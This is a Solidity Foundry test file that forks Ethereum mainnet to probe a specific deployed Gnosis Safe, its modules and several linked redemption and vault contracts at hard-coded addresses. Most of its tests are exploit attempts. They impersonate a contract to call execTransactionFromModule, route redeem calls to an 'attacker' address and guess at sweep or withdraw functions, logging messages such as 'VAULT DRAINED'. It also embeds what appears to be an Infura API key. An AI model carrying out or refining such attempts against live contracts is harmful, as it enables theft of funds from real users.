// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IGnosisSafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function isOwner(address) external view returns (bool);
    function nonce() external view returns (uint256);
    function getModules() external view returns (address[] memory);
    function isModuleEnabled(address) external view returns (bool);
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        bytes memory signatures
    ) external payable returns (bool);
    function execTransactionFromModule(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation
    ) external returns (bool);
}

contract GnosisSafeDeepDive is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeGnosisSafe() public view {
        console.log("=== ANALYZING GNOSIS SAFE ===\n");

        IGnosisSafe safe = IGnosisSafe(GNOSIS_SAFE);

        console.log("Safe address:", GNOSIS_SAFE);
        console.log("Safe code size:", GNOSIS_SAFE.code.length);

        // Get owners
        try safe.getOwners() returns (address[] memory owners) {
            console.log("\nOwners:");
            for (uint i = 0; i < owners.length; i++) {
                console.log("  ", owners[i]);
            }
        } catch {
            console.log("getOwners failed");
        }

        // Get threshold
        try safe.getThreshold() returns (uint256 threshold) {
            console.log("\nThreshold:", threshold);
        } catch {
            console.log("getThreshold failed");
        }

        // Get nonce
        try safe.nonce() returns (uint256 n) {
            console.log("Nonce:", n);
        } catch {
            console.log("nonce failed");
        }

        // Check if REDEMPTION_1 is a module
        try safe.isModuleEnabled(REDEMPTION_1) returns (bool enabled) {
            console.log("\nIs REDEMPTION_1 a module:", enabled);
        } catch {
            console.log("isModuleEnabled failed");
        }

        // Check if REDEMPTION_0 is a module
        try safe.isModuleEnabled(REDEMPTION_0) returns (bool enabled) {
            console.log("Is REDEMPTION_0 a module:", enabled);
        } catch {}

        // Check wstETH balance
        console.log("\nSafe wstETH balance:", IERC20(wstETH).balanceOf(GNOSIS_SAFE) / 1e18);
    }

    function test_CheckIfRedemption1IsModule() public {
        console.log("=== CHECKING IF REDEMPTION_1 IS A SAFE MODULE ===\n");

        // If REDEMPTION_1 is a module, it can call execTransactionFromModule!

        IGnosisSafe safe = IGnosisSafe(GNOSIS_SAFE);

        bool isModule = false;
        try safe.isModuleEnabled(REDEMPTION_1) returns (bool enabled) {
            isModule = enabled;
            console.log("REDEMPTION_1 is module:", enabled);
        } catch {
            console.log("Check failed - trying storage");

            // Check storage directly
            // Gnosis Safe modules are stored in a linked list at slot 1
            bytes32 modulesSlot = vm.load(GNOSIS_SAFE, bytes32(uint256(1)));
            console.log("Modules slot:");
            console.logBytes32(modulesSlot);
        }

        if (isModule) {
            console.log("\n*** REDEMPTION_1 IS A SAFE MODULE! ***");
            console.log("This means REDEMPTION_1 can execute Safe transactions!");

            // Try to execute via module
            uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

            vm.prank(REDEMPTION_1);
            try safe.execTransactionFromModule(
                REDEMPTION_CONTROLLER,
                0,
                abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker),
                0 // Call operation
            ) returns (bool success) {
                console.log("execTransactionFromModule:", success);
            } catch {
                console.log("execTransactionFromModule failed");
            }

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            if (vaultAfter < vaultBefore) {
                console.log("*** VAULT DRAINED VIA MODULE! ***");
            }
        }
    }

    function test_TryModuleExecution() public {
        console.log("=== TRYING MODULE EXECUTION ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Try calling execTransactionFromModule on Safe as REDEMPTION_1
        vm.startPrank(REDEMPTION_1);

        bytes memory rcCall = abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker);

        (bool s1, bytes memory d1) = GNOSIS_SAFE.call(
            abi.encodeWithSignature(
                "execTransactionFromModule(address,uint256,bytes,uint8)",
                REDEMPTION_CONTROLLER,
                0,
                rcCall,
                0
            )
        );
        console.log("execTransactionFromModule:", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWst / 1e18);

        if (attackerWst > 0) {
            console.log("\n*** MODULE EXPLOIT WORKED! ***");
        }
    }

    function test_CheckSafeModulesStorage() public view {
        console.log("=== CHECKING SAFE MODULES STORAGE ===\n");

        // Gnosis Safe 1.3.0 stores modules in a mapping at slot 1
        // The mapping is address => address (linked list)

        console.log("Checking module storage slots:");

        // Sentinel module address
        address SENTINEL = address(0x1);

        // Check if REDEMPTION_1 is in the linked list
        bytes32 r1Slot = keccak256(abi.encode(REDEMPTION_1, uint256(1)));
        bytes32 r1Value = vm.load(GNOSIS_SAFE, r1Slot);
        console.log("REDEMPTION_1 in modules:");
        console.logBytes32(r1Value);

        // Check sentinel
        bytes32 sentinelSlot = keccak256(abi.encode(SENTINEL, uint256(1)));
        bytes32 sentinelValue = vm.load(GNOSIS_SAFE, sentinelSlot);
        console.log("Sentinel value (first module):");
        console.logBytes32(sentinelValue);

        // If sentinel points to REDEMPTION_1, it's a module
        address firstModule = address(uint160(uint256(sentinelValue)));
        console.log("First module:", firstModule);

        if (firstModule == REDEMPTION_1) {
            console.log("\n*** REDEMPTION_1 IS THE FIRST MODULE! ***");
        }
    }

    function test_TryViaDelegatecallToSafe() public {
        console.log("=== TRYING VIA DELEGATECALL TO SAFE ===\n");

        // REDEMPTION_1 stores Safe at slot 4
        // If there's a delegatecall that uses slot 4...

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try calling functions on REDEMPTION_1 that might delegatecall to Safe
        bytes memory rcCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);

        // Try execTransaction pattern
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
                REDEMPTION_CONTROLLER, 0, rcCall, 0, 0, 0, 0, address(0), address(0), ""
            )
        );
        console.log("execTransaction via R1:", s1);

        // Try multiSend pattern
        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("multiSend(bytes)", rcCall)
        );
        console.log("multiSend via R1:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_AnalyzeSafeOwners() public view {
        console.log("=== ANALYZING SAFE OWNERS ===\n");

        IGnosisSafe safe = IGnosisSafe(GNOSIS_SAFE);

        try safe.getOwners() returns (address[] memory owners) {
            console.log("Safe has", owners.length, "owners:");
            for (uint i = 0; i < owners.length; i++) {
                address owner = owners[i];
                console.log("\nOwner", i, ":", owner);
                console.log("  Code size:", owner.code.length);

                // Check if owner is a contract
                if (owner.code.length > 0) {
                    console.log("  *** IS A CONTRACT ***");

                    // Check if it's a known contract
                    if (owner == TIMELOCK) {
                        console.log("  -> This is the TIMELOCK!");
                    }
                }
            }
        } catch {
            console.log("Failed to get owners");
        }
    }

    function test_CheckTreasuryInteraction() public {
        console.log("=== CHECKING TREASURY INTERACTION ===\n");

        // 0x61d027b3 returns treasury (Safe)
        // Maybe there's a withdraw to treasury function?

        deal(wstETH, REDEMPTION_1, 1000e18);

        vm.startPrank(attacker);

        // Try withdrawToTreasury or similar
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("withdrawToTreasury(uint256)", 100e18)
        );
        console.log("withdrawToTreasury(100):", s1);

        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("sendToTreasury(uint256)", 100e18)
        );
        console.log("sendToTreasury(100):", s2);

        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("sweep(address,uint256)", wstETH, 100e18)
        );
        console.log("sweep(wstETH, 100):", s3);

        vm.stopPrank();

        uint256 safeBal = IERC20(wstETH).balanceOf(GNOSIS_SAFE);
        console.log("\nSafe wstETH balance:", safeBal / 1e18);
    }
}
